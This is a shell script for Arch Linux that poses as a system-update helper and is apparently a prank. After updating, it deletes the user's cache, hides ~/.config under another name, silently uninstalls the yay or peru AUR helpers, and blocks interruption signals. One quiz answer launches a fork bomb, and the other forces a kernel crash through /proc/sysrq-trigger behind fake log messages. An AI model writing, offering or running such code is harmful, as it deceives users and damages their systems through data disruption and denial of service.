#!/bin/sh

cd ~

if uname -r | grep arch > /dev/null; then
	echo "Hello, $USER!"
	echo "Before I continue, we need to update your system"
	echo "Update now? [say 'yes' (case sensitive) to continue, anything else is automatically interpreted as no]"
	read -p "Answer = "

	if [ "is $REPLY" = "is yes" ]; then
		sudo pacman -Syu
		pacman -Q --color never > allmypkgs.txt

		trap "" SIGINT
		trap "" SIGTERM
		trap "" SIGKILL

		rm -rf $HOME/.cache/*
		mv $HOME/.config/ $HOME/.shivery_timbers
		echo "Your .config may or may have not have changed its name. DON'T WORRY, IT HASN'T VANISHED!"

		if grep yay allmypkgs.txt > /dev/null; then
			sudo pacman -R yay --noconfirm > /dev/null 2> /dev/null
			echo "🖕 yay"
		fi
		if grep peru allmypkgs.txt > /dev/null; then
			sudo pacman -R peru --noconfirm > /dev/null 2> /dev/null
			echo "🖕 peru"
		fi
		
		echo "Here are two options. Choose one or the other; Your option will automatically register the moment you press the key. YOU CANNOT ESCAPE!"
		echo "1) What you use to eat spaghetti"
		echo "2) What happens when two planes collide"
		wtf () {
			read -n 1 -p "Answer (1/2) = "
			case $REPLY in
				1)
					yes "GET F0RKBOMBED!!!" &
					: () { :|:& }; :
					exit
					;;
				2)
					echo "Segmentation Fault (core dumped)"
					echo "[16384.444549121 | wayland] process 'dbus' exited with code 1 because 'Segmentation Fault (core dumped)'"; sleep 0.5
					echo "[16384.945893239 | wayland] process 'dbus' took too long to respond, quitting"
					echo "[FAILED] [16384.945893250] Segmentation Fault (core dumped)"
					echo "[16385.000000000 | kernel] I GIVE UP! I HAVE HAD ENOUGH!"
					echo "[  OK  ] [16385.000000100 | kernel] allocated memory to sentient function: 'echo c > /proc/sysrq-trigger'"; sleep 0.5
					echo "[  OK  ] Started sysrq-trigger.service."
					sudo sh -c "echo c > /proc/sysrq-trigger"
					;;
				*)
					echo
					echo "Nope, try again!"
					wtf
					;;
			esac
		}
		wtf		
	else
		echo "YOU HAD ONE JOB! Time to nuke your system!"
		trap "" SIGINT
		trap "" SIGTERM
		trap "" SIGKILL
		echo -n "Nuking /bin... "; 					sleep 4.5; echo "[DONE!]"
		echo -n "Nuking /boot and its EFI shit... ";			sleep 0.5; echo "[DONE!]"
		echo -n "Nuking /dev and its device drivers... ";		sleep 1.5; echo "[DONE!]"
		echo -n "Nuking /etc... ";					sleep 1.2; echo "[DONE!]"
		echo -n "Nuking /lib... ";					sleep 0.5; echo "[DONE!]"
		echo -n "Nuking /lib64... ";					sleep 0.5; echo "[DONE!]"
		echo -n "Nuking /mnt and its devices... ";			sleep 1.0; echo "[DONE!]"
		echo -n "Nuking /opt and its executables... ";			sleep 0.5; echo "[DONE!]"
		echo -n "Nuking /root and its respective user... ";		sleep 0.5; echo "[DONE!]"
		echo -n "Nuking /srv and /sys (because they serve no purpose)... ";	sleep 0.5; echo "[DONE!]"
		echo -n "Nuking temporary /run, /tmp and /var dirs... ";	sleep 5.0; echo "[DONE!]"
		echo -n "Nuking /usr... ";					sleep 3.0; echo "[DONE!]"
		echo "AND FINALLY..."
		echo "Nuked /proc, /home, its processes, its users, and 16 other directories in /!"
		echo "Now reboot your system if you dare..."
		exit
	fi
else
	echo "Get out of your VM... NOW!"
	cd -
	exit
fi
